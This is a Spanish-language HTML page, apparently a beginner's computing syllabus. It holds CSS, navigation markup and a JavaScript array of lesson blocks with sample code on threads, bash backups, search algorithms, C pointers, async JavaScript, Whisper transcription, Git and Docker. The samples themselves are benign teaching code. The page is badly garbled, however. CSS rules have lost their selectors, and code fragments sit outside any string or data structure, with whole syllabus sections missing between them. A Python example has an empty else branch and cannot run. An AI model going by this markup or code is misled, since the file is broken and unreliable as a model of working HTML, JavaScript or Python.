<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Temario de Informática</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Sora:wght@300;400;500;600&display=swap');
:root{
  --bg:#0d0d12;--surf1:#13131a;--surf2:#1a1a24;--surf3:#22222f;--surf4:#2a2a3a;
  --bd:#2e2e42;--bd2:#3a3a50;
  --txt:#e8e8f2;--txt2:#b0b0cc;--txt3:#7878a0;
  --a0:#8b7ff7;--a1:#56d4b2;--a2:#f47c6e;--a3:#6ab8f5;--a4:#e07be0;--a5:#f5cc45;--a6:#82dd95;--a7:#f5a348;
  --code-bg:#0a0a10;--code-bd:#252535;
  --sb:260px;
  --content-max:900px;
  --gap:24px;
}
*{
  box-sizing:border-box;
  margin:0;
  padding:0
}
html{
  scroll-behavior:smooth
}
body{
  font-family:'Sora',sans-serif;
  background:var(--bg);
  color:var(--txt);
  font-size:14px;
  line-height:1.75;
  display:flex;
  min-height:100vh;
  overflow-x:hidden
}

::-webkit-scrollbar{
  width:5px;
  height:5px
}
::-webkit-scrollbar-track{
  background:transparent
}
::-webkit-scrollbar-thumb{
  background:var(--surf4);
  border-radius:3px
}

#sb{
  width:var(--sb);min-width:var(--sb);
  background:var(--surf1);
  border-right:1px solid var(--bd);
  position:fixed;top:0;left:0;
  height:100vh;overflow-y:auto;
  z-index:200;
  transition:transform .3s cubic-bezier(.4,0,.2,1);
}
#sb-head{
  padding:20px 18px 14px;
  border-bottom:1px solid var(--bd)
}
#sb-head h1{
  font-family:'JetBrains Mono',monospace;
  font-size:11px;
  font-weight:700;
  color:var(--a0);
  letter-spacing:.1em;
  text-transform:uppercase
}
#sb-head p{
  font-size:11px;
  color:var(--txt3);
  margin-top:3px
}
#sb-search{
  padding:10px 14px;
  border-bottom:1px solid var(--bd)
}
#sb-search input{
  width:100%;background:var(--surf2);
  border:1px solid var(--bd);
  border-radius:6px;
  padding:6px 10px;
  color:var(--txt2);
  font-size:12px;
  font-family:'Sora',sans-serif;
  outline:none
}
#sb-search input::placeholder{
  color:var(--txt3)
}
#sb-search input:focus{
  border-color:var(--a0)
}
.sb-bloque{
  border-bottom:1px solid var(--bd);
  padding:6px 0
}
.sb-bloque-hdr{
  display:flex;
  align-items:center;
  gap:8px;
  padding:7px 14px;
  cursor:pointer;
  user-select:none;
  transition:background .15s;
  border-radius:4px;
  margin:2px 6px
}
.sb-bloque-hdr:hover{
  background:var(--surf2)
}
.sb-dot{
  width:7px;
  height:7px;
  border-radius:50%;
  flex-shrink:0
}
.sb-bloque-title{
  flex:1;
  font-size:11.5px;
  font-weight:500;
  color:var(--txt)
}
.sb-bloque-num{
  font-family:'JetBrains Mono',monospace;
  font-size:9px;
  color:var(--txt3);
  background:var(--surf3);
  padding:2px 6px;
  border-radius:3px
}
.sb-chevron{
  font-size:10px;
  color:var(--txt3);
  transition:transform .2s;
  flex-shrink:0
}
.sb-bloque.closed .sb-chevron{
  transform:rotate(-90deg)
}
.sb-bloque.closed .sb-items{
  display:none
}
.sb-sec-label{
  font-size:9.5px;
  font-weight:600;
  letter-spacing:.08em;
  text-transform:uppercase;
  color:var(--txt3);
  padding:7px 18px 3px;
  margin-top:4px
}
.sb-item{
  display:flex;
  align-items:center;
  gap:6px;
  padding:4px 18px 4px 24px;
  font-size:11.5px;
  color:var(--txt3);
  cursor:pointer;
  transition:color .15s;
  border-left:2px solid transparent;
  margin:1px 0;
  text-decoration:none
}
.sb-item:hover{
  color:var(--txt2)
}
.sb-item.active{
  color:var(--txt);
  border-left-color:var(--a0);
  background:rgba(139,127,247,.05)
}
.sb-item::before{
  content:'›';
  font-size:12px;
  opacity:.5;
  flex-shrink:0
}

#hamburger{
  display:none;
  position:fixed;
  top:12px;
  left:12px;
  z-index:300;
  background:var(--surf2);
  border:1px solid var(--bd);
  border-radius:8px;
  padding:8px 10px;
  cursor:pointer;
  flex-direction:column;
  gap:4px;
  align-items:center;
  justify-content:center
}
#hamburger span{
  display:block;
  width:18px;
  height:2px;
  background:var(--txt2);
  border-radius:2px;
  transition:all .25s
}
#overlay{
  display:none;
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.6);
  z-index:150;
  backdrop-filter:blur(2px)
}

#main{
  margin-left:var(--sb);
  flex:1;
  min-width:0;
  padding:48px 60px 100px;
}
.main-inner{
  max-width:var(--content-max);
  margin:0 auto
}

.toc-wrap{
  background:var(--surf1);
  border:1px solid var(--bd);
  border-radius:12px;
  padding:22px 26px;
  margin-bottom:48px
}
.toc-wrap h2{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;
  font-weight:700;
  letter-spacing:.12em;
  text-transform:uppercase;
  color:var(--txt3);
  margin-bottom:14px
}
.toc-grid{
  display:grid;
  grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
  gap:8px
}
.toc-item{
  display:flex;
  align-items:center;
  gap:10px;
  padding:8px 12px;
  background:var(--surf2);
  border:1px solid var(--bd);
  border-radius:8px;
  cursor:pointer;
  transition:border-color .15s,background .15s;
  text-decoration:none
}
.toc-item:hover{
  border-color:var(--bd2);
  background:var(--surf3)
}
.toc-num{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;
  font-weight:700;
  min-width:20px
}
.toc-lbl{
  font-size:12px;
  color:var(--txt2)
}

.bloque{
  margin-bottom:80px;
  scroll-margin-top:20px
}
.bloque-hdr{
  display:flex;
  align-items:flex-start;
  gap:16px;margin-bottom:30px;
  padding-bottom:20px;
  border-bottom:1px solid var(--bd)
}
.bloque-badge{
  font-family:'JetBrains Mono',monospace;
  font-size:9px;
  font-weight:700;
  letter-spacing:.1em;
  text-transform:uppercase;
  padding:4px 10px;
  border-radius:4px;
  border:1px solid;
  flex-shrink:0;
  margin-top:6px;
  white-space:nowrap
}
.bloque-hdr h2{
  font-size:clamp(20px,3vw,28px);
  font-weight:600;
  line-height:1.2
}
.bloque-meta{
  display:flex;
  flex-wrap:wrap;
  gap:8px;
  margin-top:8px
}
.b-tag{
  font-size:11px;
  font-family:'JetBrains Mono',monospace;
  padding:3px 9px;
  border-radius:20px;
  border:1px solid var(--bd);
  color:var(--txt3)
}

.section{
  margin-bottom:32px
}
.sec-title{
  font-size:13px;
  font-weight:600;
  color:var(--txt2);
  letter-spacing:.04em;
  text-transform:uppercase;
  margin-bottom:12px;
  display:flex;
  align-items:center;
  gap:8px
}
.sec-title::before{
  content:'';
  display:block;
  width:3px;
  height:14px;
  border-radius:2px;
  background:var(--bd2)
}

.topic{
  background:var(--surf1);
  border:1px solid var(--bd);
  border-radius:10px;
  margin-bottom:8px;
  overflow:hidden;
  scroll-margin-top:20px
}
.topic-hdr{
  display:flex;
  align-items:center;
  gap:10px;
  padding:13px 16px;
  cursor:pointer;
  user-select:none;
  transition:background .15s
}
.topic-hdr:hover{
  background:var(--surf2)
}
.t-dot{
  width:6px;
  height:6px;
  border-radius:50%;
  flex-shrink:0
}
.t-title{
  flex:1;
  font-size:13.5px;
  font-weight:500;
  color:var(--txt)
}
.t-tag{
  font-size:10px;
  font-family:'JetBrains Mono',monospace;
  padding:2px 8px;
  border-radius:3px;
  flex-shrink:0
}
.t-chev{
  font-size:12px;
  color:var(--txt3);
  transition:transform .2s;
  flex-shrink:0
}
.topic.open .t-chev{
  transform:rotate(90deg)
}
.topic-body{
  display:none;
  padding:4px 16px 18px;
  border-top:1px solid var(--bd)
}
.topic.open .topic-body{
  display:block
}

.tabs{
  display:flex;
  gap:0;
  margin:14px 0 0;
  border-bottom:1px solid var(--bd)
}
.tab-btn{
  background:none;
  border:none;
  padding:7px 14px;
  font-size:12px;
  font-family:'Sora',sans-serif;
  color:var(--txt3);
  cursor:pointer;
  border-bottom:2px solid transparent;
  margin-bottom:-1px;
  transition:color .15s,border-color .15s
}
.tab-btn:hover{
  color:var(--txt2)
}
.tab-btn.active{
  color:var(--txt);
  border-bottom-color:var(--a0)
}
.tab-pane{
  display:none;
  padding-top:12px
}
.tab-pane.active{
  display:block
}

.items-list{
  list-style:none;
  columns:2;
  column-gap:20px
}
.items-list li{
  font-size:12.5px;
  color:var(--txt2);
  padding:3px 0 3px 14px;
  position:relative;
  break-inside:avoid;
  line-height:1.6
}
.items-list li::before{
  content:'›';
  position:absolute;
  left:0;
  color:var(--txt3)
}
.items-list li strong{
  color:var(--txt);
  font-weight:500
}

.prac-list{
  list-style:none
}
.prac-item{
  display:flex;
  gap:10px;
  padding:8px 0;
  border-bottom:1px solid var(--bd)
}
.prac-item:last-child{
  border-bottom:none
}
.prac-num{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;
  color:var(--a1);
  font-weight:700;
  flex-shrink:0;
  margin-top:2px;
  min-width:20px
}
.prac-text{
  font-size:12.5px;
  color:var(--txt2);
  line-height:1.6
}
.prac-text strong{
  color:var(--txt)
}

.code-wrap{
  margin:4px 0
}
.code-label{
  font-family:'JetBrains Mono',monospace;
  font-size:9px;
  font-weight:700;
  letter-spacing:.08em;
  text-transform:uppercase;
  color:var(--txt3);
  padding:8px 14px 6px;
  background:var(--code-bg);
  border:1px solid var(--code-bd);
  border-bottom:none;
  border-radius:8px 8px 0 0;
  display:flex;
  align-items:center;
  justify-content:space-between
}
.copy-btn{
  background:var(--surf3);
  border:1px solid var(--bd);
  border-radius:4px;
  padding:3px 8px;
  font-size:10px;
  font-family:'JetBrains Mono',monospace;
  color:var(--txt3);
  cursor:pointer;
  transition:color .15s
}
.copy-btn:hover{
  color:var(--txt)
}
pre{
  background:var(--code-bg);
  border:1px solid var(--code-bd);
  border-radius:0 0 8px 8px;
  padding:14px;
  overflow-x:auto;
  line-height:1.6;
  margin:0
}
pre code{
  font-family:'JetBrains Mono',monospace;
  font-size:12px;
  color:#c8c8e0;
  background:none;
  padding:0;
  white-space:pre
}

.items-list code, .prac-text code{
  font-family:'JetBrains Mono',monospace;
  font-size:11px;
  background:var(--surf3);
  padding:1px 5px;
  border-radius:3px;
  color:var(--a1)
}

.note{
  margin-top:12px;
  background:rgba(245,204,69,.05);
  border-left:3px solid var(--a5);
  border-radius:0 6px 6px 0;
  padding:10px 14px;
  font-size:12px;
  color:#c8c060;
  line-height:1.6
}
.note strong{
  color:var(--a5)
}

.c0{
  color:var(--a0)
} .c1{
  color:var(--a5)
} .c2{
  color:var(--a3)
} .c3{
  color:var(--a1)
}
.c4{
  color:var(--a2)
} .c5{
  color:var(--a4)
} .c6{
  color:var(--a2)
} .c7{
  color:var(--a6)
}
.c8{
  color:var(--a5)
} .c9{
  color:var(--a0)
} .c10{
  color:var(--a3)
} .c11{
  color:var(--a1)
}
.c12{
  color:var(--a4)
} .c13{
  color:var(--a7)
} .c14{
  color:var(--a2)
}

.bg0{
  background:rgba(139,127,247,.1);
  color:var(--a0);
  border-color:var(--a0)
}
.bg1{
  background:rgba(245,204,69,.1);
  color:var(--a5);
  border-color:var(--a5)
}
.bg2{
  background:rgba(106,184,245,.1);
  color:var(--a3);
  border-color:var(--a3)
}
.bg3{
  background:rgba(86,212,178,.1);
  color:var(--a1);
  border-color:var(--a1)
}

  background:rgba(244,124,110,.1);
  color:var(--a2);
  border-color:var(--a2)
}

  background:rgba(224,123,224,.1);
  color:var(--a4);
  border-color:var(--a4)
}

  background:rgba(244,124,110,.1);
  color:var(--a2);
  border-color:var(--a2)
}

  background:rgba(130,221,149,.1);
  color:var(--a6);
  border-color:var(--a6)
}

  background:rgba(245,204,69,.1);
  color:var(--a5);
  border-color:var(--a5)
}
.bg9{
  background:rgba(139,127,247,.1);
  color:var(--a0);
  border-color:var(--a0)
}
.bg10{
  background:rgba(106,184,245,.1);
  color:var(--a3);
  border-color:var(--a3)
}
.bg11{
  background:rgba(86,212,178,.1);
  color:var(--a1);
  border-color:var(--a1)
}
.bg12{
  background:rgba(224,123,224,.1);
  color:var(--a4);
  border-color:var(--a4)
}

  background:rgba(245,163,72,.1);
  color:var(--a7);

}

  color:var(--a2);
  border-color:var(--a2)
}

.dot0{
  background:var(--a0)
} .dot1{
  background:var(--a5)
} .dot2{
  background:var(--a3)
}
.dot3{
  background:var(--a1)
} .dot4{

} .dot5{

} .dot10{

@media(max-width:1439px){
  :root{
    --sb:240px;
    --content-max:820px
  }
  #main{
    padding:40px 44px 80px
  }
}

@media(max-width:1023px){
  :root{
    --sb:220px
  }
  #main{
    padding:32px 32px 80px
  }
  .items-list{
    columns:1
  }
}

@media(max-width:767px){
  #hamburger{
    display:flex
  }
  #sb{
    transform:translateX(-100%)
  }
  #sb.open{
    transform:translateX(0)
  }
  #overlay{
    display:none
  }
  #overlay.visible{
    display:block
  }
  #main{
    margin-left:0;
    padding:20px 16px 80px
  }
  .bloque-hdr{
    flex-direction:column;
    gap:8px
  }
  .items-list{
    columns:1
  }
  .toc-grid{
    grid-template-columns:1fr 1fr
  }
  .tabs{
    overflow-x:auto
  }
}

@media(min-width:2000px){
  :root{
    --sb:300px;
    --content-max:1100px
  }
  body{
    font-size:15px
  }
  #main{
    padding:64px 80px 120px
  }
  pre code{
    font-size:13px
  }
}

</head>
<body>

<button id="hamburger" aria-label="Menú" onclick="toggleSidebar()">
  <span></span><span></span><span></span>
</button>
<div id="overlay" onclick="toggleSidebar()"></div>

<nav id="sb">
  <div id="sb-head">
    <h1>Temario · Informática</h1>
    <p>Desde cero</p>
  </div>
  <div id="sb-search"><input type="text" id="sb-input" placeholder="Buscar tema..." oninput="filterSidebar(this.value)"></div>
  <div id="sb-nav"></div>
</nav>

<main id="main">
  <div class="main-inner">
    <div class="toc-wrap">
      <h2>Índice de bloques</h2>
      <div class="toc-grid" id="toc"></div>
    </div>
    <div id="content"></div>
  </div>
</main>

<script>

function safe(str) {
  const escaped = str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
  return escaped.replace(/&lt;(\/?(code|strong|em|b|i|br|kbd))&gt;/g, '<$1>');
}

const BLOQUES = [

{
  id:'b0', label:'BLOQUE 0', title:'Mentalidad y metodología',
  weeks:'1–2 sem', tipo:'Conceptual', requisitos: 'ninguno',
  sections:[
    { title:'Cómo aprender tecnología', topics:[
      { title:'El método de aprendizaje técnico', tag:'Filosofía',
        items:[
          'El conocimiento no pertenece a nadie: fue construido por miles de personas que compartieron lo que saben; tú solo continúas la cadena',
          'La actitud hacker no consiste en romper cosas necesariamente, sino en <strong>entender cómo funcionan</strong>; la curiosidad técnica vale más que cualquier herramienta',
          'Aprender tecnología funciona igual que aprender a cocinar: consumir teoría ayuda, pero construir hacer las cosas reales es lo que desarrolla habilidad',
          'El ciclo que realmente enseña es: encontrar conceptos  pasarlos a → ejemplo real luego a → la práctica por medio de un → mini-proyecto → y romperlo a propósito para después → enseñarlo',
          'El síndrome del tutorial infinito: acumular vídeos, cursos y apuntes sin crear nada produce la ilusión de progreso, no progreso real',
          'El aprendizaje basado en proyectos acelera todo: construir algo útil desde el inicio obliga a investigar, equivocarte y conectar conceptos hasta que son tan parte de ti como tu propio ser',
          'Romper las cosas es parte del proceso por lo que el error no indica fracaso, indica que llegaste al límite de lo que entiendes solo en ese momento (descansar es importante)',
          'Tiempo de calidad supera tiempo de cantidad: 45 minutos de concentración real valen más que varias horas o dias distraído entre notificaciones y otras cosas',
          'La "meseta de desesperación" es normal: llega el punto donde ya no eres principiante, pero tampoco te sientes competente; todos pasan por ahí aunque pocos lo admitan',
          'Pedir ayuda también es una habilidad: primero intenta resolverlo solo, documenta qué probaste, analizalo y luego pregunta; así aprendes mucho más rápido pues conectas mas puntos de vista lo que te abre el panorama',
          'La IA debe usarse como tutor socrático, no como máquina de copiar respuestas si delegas el razonamiento, pierdes el aprendizaje',
          'Rubber duck debugging: explicar el problema en voz alta, incluso a un objeto, obliga a ordenar ideas y muchas veces revela el error automáticamente',
          'Enseñar acelera el aprendizaje: escribir notas, grabar vídeos, explicar a otra persona o documentar un proyecto revela qué partes realmente entiendes',
          'Mantener un repositorio de aprendizaje en GitHub ayuda a medir progreso, documentar errores y construir un historial técnico propio',
          'El conocimiento compartido no se divide se multiplica; esa es una de las bases de todo el ecosistema de software libre moderno'
        ],
        practica:[

          `
          import threading
          import time

          lock_a = threading.Lock()
          lock_b = threading.Lock()

          def hilo_1():
              with lock_a:
                  print("Hilo 1: tiene lock_a, espera lock_b...")
                  time.sleep(0.1)
                  with lock_b:  # ← Este lock ya lo tiene Hilo 2
                      print("Hilo 1: tiene ambos locks")  # nunca llega aquí

          def hilo_2():
              with lock_b:
                  print("Hilo 2: tiene lock_b, espera lock_a...")
                  time.sleep(0.1)
                  with lock_a:  # ← Este lock ya lo tiene Hilo 1
                      print("Hilo 2: tiene ambos locks")  # nunca llega aquí

          t1 = threading.Thread(target=hilo_1)
          t2 = threading.Thread(target=hilo_2)
          t1.start()
          t2.start()
          # El programa se cuelga aquí. Usa Ctrl+C para terminar.
          # Solución: adquirir siempre los locks en el mismo orden
          `
        }]
      }
    ]}

          `
          #!/usr/bin/env bash
          # Backup incremental con rotación de 7 días
          set -euo pipefail
          trap 'echo "ERROR en línea $LINENO" >&2' ERR

          # ── Configuración ──────────────────────────────────────
          readonly SRC="\${1:-$HOME/documentos}"
          readonly DST="\${2:-/backup}"
          readonly MAX_BACKUPS=7
          readonly LOG="$DST/backup.log"
          readonly TS=\$(date +"%Y-%m-%d_%H-%M-%S")
          readonly DEST="$DST/backup_$TS.tar.gz"

          # ── Funciones ──────────────────────────────────────────
          log() { echo "[\$(date '+%H:%M:%S')] $*" | tee -a "$LOG"; }

          check_disk_space() {
              local available
              available=\$(df -BM "$DST" | awk 'NR==2 {gsub(/M/,"",$4); print $4}')
              if [[ $available -lt 500 ]]; then
                  log "ERROR: Solo \${available}MB disponibles en $DST"
                  exit 1
              fi
          }

          rotate_backups() {
              local count
              count=\$(find "$DST" -name "backup_*.tar.gz" | wc -l)
              if [[ $count -ge \$MAX_BACKUPS ]]; then
                  find "$DST" -name "backup_*.tar.gz" | sort | head -n $(( count - MAX_BACKUPS + 1 )) | xargs rm -f
                  log "Backups antiguos eliminados (máx: $MAX_BACKUPS)"
              fi
          }

          # ── Ejecución ──────────────────────────────────────────
          mkdir -p "$DST"
          log "Iniciando backup: $SRC → $DEST"
          check_disk_space
          rotate_backups

          tar czf "$DEST" --exclude="*.tmp" --exclude=".git" "$SRC" 2>/dev/null
          SIZE=$(du -sh "$DEST" | cut -f1)
          log "Backup completado: $DEST ($SIZE)"

          # Uso: ./backup.sh /home/usuario/docs /mnt/backup
          `
        }]

          import time
          import random

          def busqueda_lineal(arr, objetivo):
              for i, v in enumerate(arr):
                  if v == objetivo:
                      return i
              return -1

          def busqueda_binaria(arr, objetivo):
              izq, der = 0, len(arr) - 1
              while izq <= der:
                  mid = (izq + der) // 2
                  if arr[mid] == objetivo:
                      return mid
                  elif arr[mid] < objetivo:
                      izq = mid + 1
                  else:
                      der = mid - 1
              return -1

          # Comparar con distintos tamaños
          for n in [100, 1_000, 10_000, 100_000]:
              arr = sorted(random.sample(range(n * 10), n))
              objetivo = arr[-1]  # Peor caso: último elemento

              t0 = time.perf_counter()
              busqueda_lineal(arr, objetivo)
              t_lineal = (time.perf_counter() - t0) * 1e6  # microsegundos

              t0 = time.perf_counter()
              busqueda_binaria(arr, objetivo)
              t_binaria = (time.perf_counter() - t0) * 1e6

              print(f"n={n:>7}: lineal={t_lineal:>8.2f}µs  binaria={t_binaria:>6.2f}µs")

            # ── IMPERATIVO (paso a paso, estado mutable) ─────────────
            def duplicados_imperativo(nums):
                vistos = []
                duplicados = []
                for n in nums:
                    if n in vistos and n not in duplicados:
                        duplicados.append(n)
                    else:

                return duplicados

            # ── FUNCIONAL (sin estado, sin bucles explícitos) ─────────
            from collections import Counter
            def duplicados_funcional(nums):
                conteos = Counter(nums)
                return list(filter(lambda x: conteos[x] > 1, set(nums)))

            # O más idiomático:
            def duplicados_funcional2(nums):
                c = Counter(nums)
                return [k for k, v in c.items() if v > 1]

          #include <stdlib.h>
          #include <string.h>

          // ── Demostración de punteros ──────────────────────────────
          void demo_punteros(void) {
              int x = 42;
              int *ptr = &x;        // ptr apunta a x

              printf("Valor de x:      %d\n", x);
              printf("Dirección de x:  %p\n", (void*)&x);
              printf("Valor de ptr:    %p\n", (void*)ptr);   // igual que &x
              printf("Valor en *ptr:   %d\n", *ptr);          // igual que x

              *ptr = 100;           // modifica x a través del puntero
              printf("x después de *ptr=100: %d\n", x);

              // Aritmética de punteros
              int arr[5] = {10, 20, 30, 40, 50};
              int *p = arr;         // apunta al primer elemento
              for (int i = 0; i < 5; i++)
                  printf("arr[%d] = %d  (en %p)\n", i, *(p + i), (void*)(p + i));
          }

          // ── Lista enlazada con memoria dinámica ──────────────────
          typedef struct Nodo {
              int dato;
              struct Nodo *siguiente;
          } Nodo;

          Nodo *crear_nodo(int dato) {
              Nodo *n = malloc(sizeof(Nodo));
              if (!n) { fprintf(stderr, "Error: malloc falló\n"); exit(1); }
              n->dato = dato;
              n->siguiente = NULL;
              return n;
          }

          void insertar_frente(Nodo **cabeza, int dato) {
              Nodo *nuevo = crear_nodo(dato);
              nuevo->siguiente = *cabeza;
              *cabeza = nuevo;
          }

          void imprimir_lista(Nodo *cabeza) {
              for (Nodo *p = cabeza; p; p = p->siguiente)
                  printf("%d → ", p->dato);
              printf("NULL\n");
          }

          void liberar_lista(Nodo **cabeza) {
              Nodo *actual = *cabeza;
              while (actual) {
                  Nodo *siguiente = actual->siguiente;
                  free(actual);     // liberar cada nodo
                  actual = siguiente;
              }
              *cabeza = NULL;       // prevenir use-after-free
          }

          int main(void) {
              demo_punteros();
              printf("\n--- Lista enlazada ---\n");

              Nodo *lista = NULL;
              insertar_frente(&lista, 30);
              insertar_frente(&lista, 20);
              insertar_frente(&lista, 10);
              imprimir_lista(lista);   // 10 → 20 → 30 → NULL
              liberar_lista(&lista);   // SIEMPRE liberar al final
              return 0;
          }
          `

        code:[{ lang:'javascript', label:'Evolución: callbacks → Promises → async/await', src:
          `
          // ── Callbacks (el origen) ───────────────────────────────
          const fs = require('fs');

          // Callback hell: anidar es una pesadilla
          fs.readFile('a.txt', 'utf8', (err, dataA) => {
            if (err) return console.error(err);
            fs.readFile('b.txt', 'utf8', (err, dataB) => {
              if (err) return console.error(err);
              fs.writeFile('resultado.txt', dataA + dataB, (err) => {
                if (err) return console.error(err);
                console.log('Listo');          // ← callback hell
              });
            });
          });

          // ── Promises (mucho mejor) ──────────────────────────────
          const fsp = require('fs').promises;

          fsp.readFile('a.txt', 'utf8')
            .then(dataA => fsp.readFile('b.txt', 'utf8').then(dataB => dataA + dataB))
            .then(contenido => fsp.writeFile('resultado.txt', contenido))
            .then(() => console.log('Listo'))
            .catch(err => console.error('Error:', err));

          // ── Async/await (lo más legible) ────────────────────────
          async function combinarArchivos() {
            try {
              const [dataA, dataB] = await Promise.all([
                fsp.readFile('a.txt', 'utf8'),
                fsp.readFile('b.txt', 'utf8')   // ambos se leen EN PARALELO
              ]);
              await fsp.writeFile('resultado.txt', dataA + dataB);
              console.log('Listo');
            } catch (err) {
              console.error('Error:', err.message);
            }
          }

          // ── Retry con backoff exponencial ──────────────────────
          async function fetchConRetry(url, maxIntentos = 3) {
            for (let intento = 1; intento <= maxIntentos; intento++) {
              try {
                const res = await fetch(url);
                if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
                return await res.json();
              } catch (err) {
                if (intento === maxIntentos) throw err;
                const espera = 2 ** intento * 100;   // 200ms, 400ms, 800ms...
                console.log(\`Reintento \${intento}/\${maxIntentos} en \${espera}ms...\`);
                await new Promise(r => setTimeout(r, espera));
              }
            }
          }

          # Instalar: pip install openai-whisper
          # También necesitas ffmpeg: sudo apt install ffmpeg

          import whisper
          from pathlib import Path

          def transcribir(archivo_audio: str, idioma: str = "es") -> dict:
              """
              Transcribe un archivo de audio a texto.
              Modelos disponibles: tiny, base, small, medium, large
              Más grande = más preciso pero más lento y usa más RAM
              """
              modelo = whisper.load_model("small")   # ~460 MB, buen balance

              print(f"Transcribiendo: {archivo_audio}")
              resultado = modelo.transcribe(
                  archivo_audio,
                  language=idioma,
                  verbose=False
              )

              return {
                  "texto":    resultado["text"],
                  "idioma":   resultado["language"],
                  "segmentos": [
                      {
                          "inicio":  round(seg["start"], 2),
                          "fin":     round(seg["end"], 2),
                          "texto":   seg["text"].strip()
                      }
                      for seg in resultado["segments"]
                  ]
              }

          # Uso básico
          resultado = transcribir("reunion.mp3")
          print("TRANSCRIPCIÓN COMPLETA:")
          print(resultado["texto"])

          # Guardar como subtítulos SRT
          def exportar_srt(segmentos: list, salida: str):
              def formato_tiempo(segundos: float) -> str:
                  h = int(segundos // 3600)
                  m = int((segundos % 3600) // 60)
                  s = int(segundos % 60)
                  ms = int((segundos % 1) * 1000)
                  return f"{h:02d}:{m:02d}:{s:02d},{ms:03d}"

              with open(salida, 'w', encoding='utf-8') as f:
                  for i, seg in enumerate(segmentos, 1):
                      f.write(f"{i}\n")
                      f.write(f"{formato_tiempo(seg['inicio'])} --> {formato_tiempo(seg['fin'])}\n")
                      f.write(f"{seg['texto']}\n\n")

{
  id:'b17', label:'BLOQUE 17', title:'Git, Docker y CI/CD',

    { title:'Git y flujos de trabajo profesionales', topics:[
      { title:'Git internals y comandos avanzados', tag:'Git',
        items:[

          'git add -p: stage cambios por hunk (fragmento), no por archivo completo',
          'git commit --amend: modificar el último commit solo antes de hacer push',
          'git rebase -i: squash, fixup, reorder, editar mensajes de commits pasados',
          'Merge vs rebase: cuándo usar cada uno regla de oro: nunca rebase lo ya pusheado',
          'git bisect: búsqueda binaria en la historia para encontrar el commit que rompió algo',
          'git reflog: historial de todo lo que apuntó HEAD el salvavidas para recuperar trabajo perdido',
          'git stash: guardar cambios sin commitear temporalmente',
          'git cherry-pick: aplicar un commit específico en otra rama',
          'Conventional Commits: feat:, fix:, chore:, docs:, refactor: estandarizar mensajes',
          'Git hooks: pre-commit (lint), commit-msg (convención), pre-push (tests)'
        ],
        practica:[
          'Usar git bisect para encontrar en qué commit se introdujo un bug en un repo con 20 commits',
          'Configurar husky, lint-staged para correr el linter automáticamente en cada commit',
          'Simular y resolver un merge conflict entre dos ramas con cambios en las mismas líneas'
        ],
        code:[{ lang:'bash', label:'Git: flujo diario y comandos avanzados', src:
          `
          # ── Flujo diario profesional ─────────────────────────────
          git switch -c feature/nueva-funcionalidad   # crear rama desde main
          # ... trabajar ...
          git add -p                                  # staging selectivo por hunk
          git commit -m "feat: añadir búsqueda de usuarios"
          git push -u origin feature/nueva-funcionalidad

          # ── Rebase interactivo: limpiar historial antes del PR ────
          git rebase -i HEAD~4   # interactuar con los últimos 4 commits
          # En el editor:
          # pick   a1b2c3 feat: borrador inicial
          # squash d4e5f6 fix: corrección de typo        ← fusionar con anterior
          # squash 7g8h9i chore: quitar console.logs    ← fusionar con anterior
          # reword j0k1l2 refactor: renombrar variable   ← solo cambiar mensaje

          # ── Bisect: encontrar el commit que rompió algo ──────────
          git bisect start
          git bisect bad HEAD          # el bug existe en el commit actual
          git bisect good v1.0.0       # el bug no existía en v1.0.0
          # Git hace checkout a commits intermedios...
          # Pruebas tu código, dices:
          git bisect good              # este commit está bien
          git bisect bad               # este commit está roto
          # Git encuentra el commit exacto que introdujo el bug

          # ── Configuración útil de .gitconfig ─────────────────────
          git config --global alias.lg \
            "log --oneline --graph --decorate --all"
          git config --global alias.undo \
            "reset --soft HEAD~1"   # deshacer último commit sin perder cambios
          `
        }]
      }
    ]},
    { title:'Docker y CI/CD', topics:[
      { title:'Docker: contenedores en la práctica', tag:'DevOps',
        items:[
          'El problema: "en mi máquina funciona" → Docker da reproducibilidad total',
          'Contenedores vs VMs: comparten el kernel del host mucho más ligeros y rápidos',
          'Imágenes: capas inmutables (layers), union filesystem cada instrucción Dockerfile es una capa',
          'Dockerfile completo: FROM, ARG, ENV, RUN, COPY, WORKDIR, USER, EXPOSE, VOLUME, CMD, ENTRYPOINT',
          'Multi-stage builds: compilar en imagen grande, copiar solo el binario a imagen mínima (alpine/distroless)',
          'CMD vs ENTRYPOINT: CMD es el comando por defecto (sobreescribible), ENTRYPOINT fija el ejecutable',
          'Docker Compose: definir el stack completo (app, db, redis, etc.) en YAML',
          'Volúmenes: persistir datos fuera del contenedor bind mounts vs named volumes',
          'Healthcheck: verificar que el contenedor está realmente funcionando, no solo corriendo',
          'Seguridad: no correr como root, usar USER no-root, escanear con Trivy, .dockerignore',
          'Registros: Docker Hub, GitHub Container Registry (ghcr.io), AWS ECR'
        ],
        practica:[
          'Dockerizar el proyecto full-stack: 3 contenedores (frontend, backend, postgres) con Compose',
          'Multi-stage build para Node.js: imagen dev con devDependencies vs producción solo con el build',
          'Configurar healthcheck y observar cómo Compose reintenta si falla'
        ],
        code:[{ lang:'dockerfile', label:'Dockerfile multi-stage para Node.js', src:
          `
          # ── Etapa 1: Construcción (imagen grande con devDependencies) ──
          FROM node:20-alpine AS builder
          WORKDIR /app

          COPY package*.json ./
          RUN npm ci                    # instala TODAS las dependencias (incluyendo devDeps)

          COPY . .
          RUN npm run build             # compilar TypeScript, bundlear, etc.

          # ── Etapa 2: Producción (imagen mínima) ──────────────────────
          FROM node:20-alpine AS prod
          WORKDIR /app

          # Solo copiar lo necesario de la etapa anterior
          COPY --from=builder /app/dist ./dist
          COPY --from=builder /app/package*.json ./

          RUN npm ci --omit=dev         # solo dependencias de producción
          RUN addgroup -S appgroup && adduser -S appuser -G appgroup

          USER appuser                  # no correr como root
          EXPOSE 3000

          HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
            CMD wget -qO- http://localhost:3000/health || exit 1

          CMD ["node", "dist/index.js"]
          `
        }]
      }
    ]}
